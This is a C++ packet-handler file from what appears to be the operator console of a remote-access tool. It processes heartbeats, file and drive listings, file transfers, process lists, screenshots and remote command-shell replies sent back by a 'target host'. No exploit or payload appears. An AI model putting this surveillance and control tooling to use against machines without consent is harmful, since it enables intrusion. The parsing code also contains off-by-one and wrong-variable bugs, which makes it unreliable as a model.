//******************************************************************************
// License:     MIT
// Author:      Hoffman
// Create Time: 2018-07-24
// Description: 
//      The functinos achieve for deal with package from target host.
//
// Modify Log:
//      2018-07-24    Hoffman
//      Info: Add below functions.
//              OnHeartBeat();
//              OnHandlePacket();
//              
//      2018-11-22    Hoffman
//      Info: Modify below functions.
//              OnCMDReply(): 
//                  1. Add check for cmd dialog point.
//              OnHandlePacket(): 
//                  1. Modify some debug info output.
//              
//******************************************************************************

#include "stdafx.h"
#include "StructShare.h"
#include "FileTransferDlg.h"
#include "ClientManager.h"
#include "FileTransferStruct.h"
#include "PacketHandle.h"
#include "CmdDlg.h"
#include "CommunicationIOCP.h"


BOOL OnHeartBeat(SOCKET sctTargetSocket,
                 PCLIENTINFO pstClientInfo,
                 CCommunicationIOCP &IOCP)
{
    CString csTmpData;
    BOOL bRet = SendDataUseIOCP(pstClientInfo, IOCP, csTmpData, PT_HEARTBEAT);

    return bRet;
} 

BOOL OnFileList(SOCKET sctTargetSocket,
                char *szBuffer,
                size_t uiLen,
                PCLIENTINFO pstClientInfo,
                CCommunicationIOCP &IOCP)
{
    pstClientInfo->pFileTransferDlg_->m_csTargetHostFileList.Empty();

    memmove(pstClientInfo->pFileTransferDlg_->
            m_csTargetHostFileList.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);
    pstClientInfo->pFileTransferDlg_->m_csTargetHostFileList.ReleaseBuffer();
    // 清空接收临时缓冲区
    memset(szBuffer, 0, uiLen);

    SetEvent(pstClientInfo->pFileTransferDlg_->m_hGetTargetFileListEvent);

    return TRUE;
} //! OnFileList END

BOOL OnFileDevice(SOCKET sctTargetSocket,
                  char *szBuffer,
                  size_t uiLen,
                  PCLIENTINFO pstClientInfo,
                  CCommunicationIOCP &IOCP)
{
    pstClientInfo->pFileTransferDlg_->m_csTargetHostDriverList.Empty();
    // 将数据传给文件传输对话框
    pstClientInfo->pFileTransferDlg_->m_uiTargetHostDriverLen = uiLen;
    memmove(pstClientInfo->pFileTransferDlg_->
            m_csTargetHostDriverList.GetBufferSetLength(PACKET_CONTENT_MAXSIZE),
            szBuffer,
            uiLen);

    pstClientInfo->pFileTransferDlg_->
        m_csTargetHostDriverList.ReleaseBuffer();

    // Clear temp buffer receive.
    memset(szBuffer, 0, uiLen);

    // Signal the evet get driver successfully.
    SetEvent(pstClientInfo->pFileTransferDlg_->m_hGetTargetDeviceEvent);
    
    return TRUE;
}

BOOL OnFileData(SOCKET sctTargetSocket,
                char *szBuffer,
                PACKETFORMAT &ref_stHeader,
                PCLIENTINFO pstClientInfo,
                CCommunicationIOCP &IOCP)
{
    CString csFileData;
    //***********************************************************
    //* Alarm * This memory will free when this data have been writeen.
    //***********************************************************
    FILEDATAINQUEUE *pstFileData = new FILEDATAINQUEUE;

    // Get file name and postion.
    pstFileData->phFileNameWithPath_ = ref_stHeader.szFileFullName_;
    pstFileData->ullFilePointPos_ = ref_stHeader.ullFilePointPos_;
    pstFileData->ulTaskId_ = ref_stHeader.ulTaskId_;

    // Wirte file data to buffer object.
    pstFileData->FileDataBuffer_.Write((PBYTE)szBuffer, ref_stHeader.dwSize_);

    // Clear temp buffer receive.
    memset(szBuffer, 0, ref_stHeader.dwSize_);

    // Put file data into queue that FileTransfer do it.
    BOOL bRet = FALSE;
    bRet = pstClientInfo->pFileTransferDlg_->SendMessage(WM_HASFILEDATA, 
                                                         (WPARAM)pstFileData, 
                                                         0);

    return bRet;
} //! OnFileData END

// Deal with the reply from target host.
BOOL OnCMDReply(SOCKET sctTargetSocket,
                char *szBuffer,
                size_t uiLen,
                PCLIENTINFO pstClintInfo)
{
    CString csCmdReply;
    szBuffer[uiLen] = _T('\0');
    csCmdReply = szBuffer;

    memset(szBuffer, 0, uiLen);

    if (NULL != pstClintInfo->pCmdDlg_)
    {
        pstClintInfo->pCmdDlg_->SendMessage(WM_HASCMDREPLY,
                                            (WPARAM)&csCmdReply,
                                            0);
    }

    return TRUE;
}

// Deal with the info from target host.
BOOL OnProcessInfo(SOCKET sctTargetSocket,
                   char *pszBuffer,
                   size_t uiLen,
                   PCLIENTINFO pstClintInfo)
{
    CString csProcessInfoList;
    char *pszTmpBuffer = new char[uiLen + 1];
    memset(pszTmpBuffer, 0, uiLen + 1);
    memmove(pszTmpBuffer, pszBuffer, uiLen + 1);

    csProcessInfoList = pszTmpBuffer;

    if (pszTmpBuffer != NULL)
    {
        delete[] pszTmpBuffer;
        pszTmpBuffer = NULL;
    }

    // 解析客户端发送过来的进程信息列表
    while (!csProcessInfoList.IsEmpty())
    {
        CString csProcessInfo;
        int iProcessInfoPos = csProcessInfoList.Find(_T("|"));
        csProcessInfo = csProcessInfoList.Left(iProcessInfoPos);
        csProcessInfoList =
            csProcessInfoList.Right(
                csProcessInfoList.GetLength() - iProcessInfoPos - 1);

        // EXE文件名
        int iExeFilePos = csProcessInfo.Find(_T("?"));
        CString csExeFile = csProcessInfo.Left(iExeFilePos);
        csProcessInfo =
            csProcessInfo.Right(
                csProcessInfo.GetLength() - iExeFilePos - 1);

        // 进程ID
        int iProcessIdPos = csProcessInfo.Find(_T("?"));
        CString csProcessId = csProcessInfo.Left(iProcessIdPos);
        csProcessInfo =
            csProcessInfo.Right(
                csProcessInfo.GetLength() - iExeFilePos - 1);

        // 父进程ID
        int iParentIdPos = csProcessInfo.Find(_T("?"));
        CString csParentid = csProcessInfo.Left(iParentIdPos);
        csProcessInfo =
            csProcessInfo.Right(
                csProcessInfo.GetLength() - iParentIdPos - 1);

        // 获取全路径
        iParentIdPos = csProcessInfo.Find(_T("?"));
        CString csFullPath = csProcessInfo.Left(iParentIdPos);
        csProcessInfo =
            csProcessInfo.Right(
                csProcessInfo.GetLength() - iParentIdPos - 1);
    } //! while 解析进程列表 END

    return TRUE;
}

BOOL OnScreenPicture(SOCKET sctTargetSocket,
                     char *szBuffer,
                     size_t uiLen,
                     PCLIENTINFO pstClintInfo)
{

    return TRUE;
}


BOOL OnHandlePacket(PACKETTYPE ePacketType,
                    SOCKET sctTargetSocket,
                    char *szBuffer,
                    PACKETFORMAT &ref_stHeader,
                    PCLIENTINFO pstClientInfo,
                    CCommunicationIOCP &IOCP)
{
    BOOL bRet = FALSE;
    
    // Packet Identification.
    switch (ePacketType)
    {
        case PT_HEARTBEAT:
        {
            OutputDebugString(_T("收到心跳包\r\n"));
            // Deel with heartbeat.
            bRet = OnHeartBeat(sctTargetSocket,
                               pstClientInfo,
                               IOCP);
            if (!bRet)
            {
                OutputDebugString(_T("心跳包处理失败\r\n"));
            }

            break;
        }
        // The data of target host's list.
        case PT_FILE_LIST:
        {
            OutputDebugString(_T("收到文件列表信息\r\n"));
            bRet = OnFileList(sctTargetSocket,
                              szBuffer,
                              ref_stHeader.dwSize_,
                              pstClientInfo,
                              IOCP);
            if (!bRet)
            {
                OutputDebugString(_T("文件列表信息处理失败"));
            }
            break;
        }
        // The device of target host.
        case PT_FILE_DEVICE:
        {
#ifdef DEBUG
            OutputDebugString(_T("收到主机盘符信息\r\n"));
#endif // DEBUG
            bRet = OnFileDevice(sctTargetSocket,
                                szBuffer,
                                ref_stHeader.dwSize_,
                                pstClientInfo,
                                IOCP);
            if (!bRet)
            {
                OutputDebugString(_T("主机盘符信息处理失败"));
            }
            break;
        }
        case PT_FILE_DATA:
        {
            bRet = OnFileData(sctTargetSocket,
                              szBuffer,
                              ref_stHeader,
                              pstClientInfo,
                              IOCP);
            if (!bRet)
            {
#ifdef DEBUG
                OutputDebugStringWithInfo(_T("Recive the GETFILE data "
                                             "from target host.\r\n"),
                                          __FILET__,
                                          __LINE__);
#endif // DEBUG
            }
            break;
        }
        case PT_PROCESS_INFO:
        {
#ifdef DEBUG
            OutputDebugString(_T("收到目标发来的进程信息\r\n"));
#endif // DEBUG
            bRet = OnProcessInfo(sctTargetSocket,
                                 szBuffer,
                                 ref_stHeader.dwSize_,
                                 pstClientInfo);
            if (!bRet)
            {
#ifdef DEBUG
            OutputDebugString(_T("收到目标发来的进程信息\r\n"));
#endif // DEBUG
            }
            break;
        }
        case PT_PROCESSCOMMAND_KILL:
        {
            OutputDebugString(_T("进程KILL成功\r\n"));
            break;
        }
        case PT_SCREENPICTURE:
        {
            bRet = OnScreenPicture(sctTargetSocket,
                                   szBuffer,
                                   ref_stHeader.dwSize_,
                                   pstClientInfo);
            break;
        }
        case PT_CMD_REPLY:
        {
#ifdef DEBUG
            OutputDebugString(_T("收到CMD的回复信息\r\n"));
#endif // DEBUG
            bRet = OnCMDReply(sctTargetSocket,
                              szBuffer,
                              ref_stHeader.dwSize_,
                              pstClientInfo);
            if (!bRet)
            {
#ifdef DEBUG
                OutputDebugString(_T("CMD的回复信息\r\n"));
#endif // DEBUG
            }
            break;
        }
        default:
        {
            OutputDebugString(_T("数据包类型不在处理范围内\r\n"));
            break;
        }
    } //! switch "Packet Identification" END

    return bRet;
} //! OnHandlePacket END